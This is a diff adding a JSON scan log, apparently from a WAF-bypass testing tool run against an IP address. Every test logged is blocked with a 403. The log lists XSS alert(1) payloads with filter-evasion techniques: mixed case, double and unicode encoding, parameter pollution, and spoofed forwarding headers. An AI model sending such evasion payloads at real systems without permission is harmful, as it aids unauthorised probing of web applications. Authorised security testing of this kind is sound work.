@@ -1,0 +1,74 @@
+{
+  "target": "https://195.181.250.15",
+  "waf_detected": true,
+  "waf_type": "Generic WAF",
+  "confidence": 0.7,
+  "signatures_matched": [],
+  "response_info": {
+    "status_code": 403,
+    "headers": {
+      "Connection": [
+        "keep-alive"
+      ],
+      "Content-Type": [
+        "text/html; charset=iso-8859-1"
+      ],
+      "Date": [
+        "Mon, 16 Jun 2025 17:39:34 GMT"
+      ],
+      "Server": [
+        "nginx"
+      ],
+      "Vary": [
+        "Accept-Encoding"
+      ]
+    },
+    "body_snippet": "\u003c!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"\u003e\n\u003chtml\u003e\u003chead\u003e\n\u003ctitle\u003e403 Forbidden\u003c/title\u003e\n\u003c/head\u003e\u003cbody\u003e\n\u003ch1\u003eForbidden\u003c/h1\u003e\n\u003cp\u003eYou don't have permission to access this resource.\u003c/p\u003e\n\u003c/body\u003e\u003c/html\u003e\n",
+    "content_length": 199
+  },
+  "bypass_tests": [
+    {
+      "technique": "Case Variation",
+      "payload": "/?test=\u003cScRiPt\u003ealert(1)\u003c/ScRiPt\u003e",
+      "success": false,
+      "response_code": 403
+    },
+    {
+      "technique": "Double Encoding",
+      "payload": "/?test=%253Cscript%253Ealert(1)%253C/script%253E",
+      "success": false,
+      "response_code": 403
+    },
+    {
+      "technique": "Unicode Encoding",
+      "payload": "/?test=\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
+      "success": false,
+      "response_code": 403
+    },
+    {
+      "technique": "HTTP Parameter Pollution",
+      "payload": "/?test=\u003cscript\u003e\u0026test=alert(1)\u003c/script\u003e",
+      "success": false,
+      "response_code": 403
+    },
+    {
+      "technique": "X-Forwarded-For",
+      "payload": "/?test=\u003cscript\u003ealert(1)\u003c/script\u003e",
+      "success": false,
+      "response_code": 403
+    },
+    {
+      "technique": "X-Real-IP",
+      "payload": "/?test=\u003cscript\u003ealert(1)\u003c/script\u003e",
+      "success": false,
+      "response_code": 403
+    },
+    {
+      "technique": "Content-Type Manipulation",
+      "payload": "/?test=\u003cscript\u003ealert(1)\u003c/script\u003e",
+      "success": false,
+      "response_code": 403
+    }
+  ],
+  "scan_time": 1261257168
+}
